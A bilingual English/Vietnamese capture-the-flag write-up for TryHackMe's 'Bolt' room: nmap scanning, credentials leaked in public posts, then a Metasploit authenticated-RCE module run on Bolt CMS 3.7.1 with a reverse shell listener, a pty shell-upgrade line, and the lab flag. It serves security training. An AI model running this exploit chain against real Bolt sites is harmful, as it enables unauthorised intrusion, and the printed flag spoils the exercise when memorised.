
# Bolt – TryHackMe Detailed Write-up  
*(Bản hướng dẫn chi tiết khai thác máy Bolt trên TryHackMe)*

---

## Overview (Tổng quan)

In this room, we deal with **Bolt CMS** which is vulnerable to an **Authenticated Remote Code Execution (RCE)**.  
*(Trong phòng này, ta làm với Bolt CMS có lỗ hổng **Authenticated Remote Code Execution**.)*

We will: reconnaissance, find credentials leaked in public content, log in, determine version, find exploit, and get a shell.  
*(Ta sẽ: khám phá, tìm thông tin đăng nhập bị lộ công khai, đăng nhập, xác định version, tìm exploit, và có shell.)*

---

## 1. Reconnaissance / Enumeration (Khám phá / Liệt kê)

1. Run `nmap` to scan all TCP ports, detect services, versions, etc.:

   ```bash
   nmap -sC -sV -Pn -p- <target_ip>
   ```

   - `-sC`: default scripts, giúp rà các lỗ hổng / thông tin cơ bản.  
   - `-sV`: version detection, để biết phiên bản dịch vụ (PHP, web server, etc.).  
   - `-Pn`: treat host as up, bỏ qua bước ping / host discovery (nhanh hơn trong lab).  
   - `-p-`: scan tất cả port TCP.  

2. From scan you see ports **22**, **80**, **8000** are open.  
   - Port 22: SSH (not immediately useful unless creds found)  
   - Port 80: HTTP default Apache page, little useful.  
   - Port 8000: HTTP, shows Bolt CMS site.  

3. Visit the web site on port 8000. Observe that the page footer / generator metadata says “Bolt” as CMS.  

---

## 2. Finding Leaked Credentials (Tìm thông tin đăng nhập bị lộ)

1. Browse public posts / entries like **/entry/message-from-admin** (or similar path).  
2. In that post, find **username**: `bolt`.  
3. In another post (e.g. “Message for IT Department”), find **password**: `boltadmin123`.  

**Why this matters:**  
- Credentials with admin privileges allow further actions.  
- Sensitive Information Disclosure = when secret data (passwords, keys, tokens) are exposed where unauthorized persons can see.  

---

## 3. Logging In & Version Discovery (Đăng nhập & Xác định phiên bản)

1. Go to the login page: `/bolt/login`. Use `bolt / boltadmin123` to login.  
2. After login, in the admin dashboard (usually footer or bottom left), find version: **Bolt 3.7.1**.  

---

## 4. Finding the Exploit (Tìm exploit phù hợp)

1. Use `searchsploit bolt` or browse Exploit-DB to locate exploits for Bolt version ~3.7.x.  
2. Found: **Exploit‑DB ID 48296**, titled “Bolt CMS 3.7.0 – Authenticated Remote Code Execution”.  
3. Also note there is a Metasploit module added recently matching that exploit: `exploit/unix/webapp/bolt_authenticated_rce`.  

**Concepts explained:**  
- **Exploit‑DB**: a public database of known exploits.  
- **Metasploit module**: a ready‑to‑use code in Metasploit framework that automates exploitation process.  
- **Authenticated**: you need to be logged in (with admin or enough privileges).  
- **Remote Code Execution (RCE)**: ability to run arbitrary commands on server from outside (remotely).  

---

## 5. Exploitation (Khai thác)

1. Use Metasploit:

   ```bash
   msfconsole
   use exploit/unix/webapp/bolt_authenticated_rce
   set RHOSTS <target_ip>
   set RPORT 8000
   set USERNAME bolt
   set PASSWORD boltadmin123
   set LHOST <your_ip>
   set LPORT <your_listening_port>
   run
   ```

   - `RHOSTS`: target machine IP.  
   - `USERNAME` / `PASSWORD`: creds found earlier.  
   - `LHOST`, `LPORT`: your listener for reverse shell.  

2. After exploit runs, get a shell on the target (often as root in this lab).  

3. Stabilize shell if needed (e.g. spawn TTY, upgrade shell). *(ví dụ dùng `python3 -c "import pty; pty.spawn('/bin/bash')"`) *

---

## 6. Capturing the Flag & Post Exploitation (Lấy flag & sau khi có quyền)

1. Once shell is obtained, navigate to home directory or root, depending where lab places flag. Found file `flag.txt`.  
2. Read the flag. In many write‑ups the flag is something like `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`.  

---

## 7. Summary / Lessons (Tóm lại / Bài học)

- Exposed credentials = big weakness. Even if system version is vulnerable, nếu bạn không có creds, khó mà khai thác được.  
- Knowing CMS version is key: exploit chỉ hoạt động nếu version phù hợp.  
- Use public exploit sources (Exploit‑DB) & Metasploit module để nhanh & giảm sai sót.  
- Always secure admin content, prevent info leakage. Patch thường xuyên.  

---

## 8. Glossary of Terms (Giải thích các từ chuyên môn)

| Term | Meaning |
|---|---------|
| **Reconnaissance** | Gathering info (ports, services, version) before attacking |
| **Enumeration** | Going deeper: listing directories, pages, finding credentials etc. |
| **CMS** | Content Management System — platform to build/manage website content |
| **Authenticated RCE** | Remote Code Execution that requires login credentials |
| **Exploit‑DB** | Database of known public exploits |
| **Metasploit module** | Pre‑built exploit script in Metasploit framework |
| **Reverse shell** | Shell session from target machine back to attacker (so attacker controls) |
| **Privilege escalation** | Gaining higher rights (e.g. from regular user to root) |

---

# Flag

THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}

*(Bạn nhớ thay flag thật của lab bạn vào nếu khác.)*
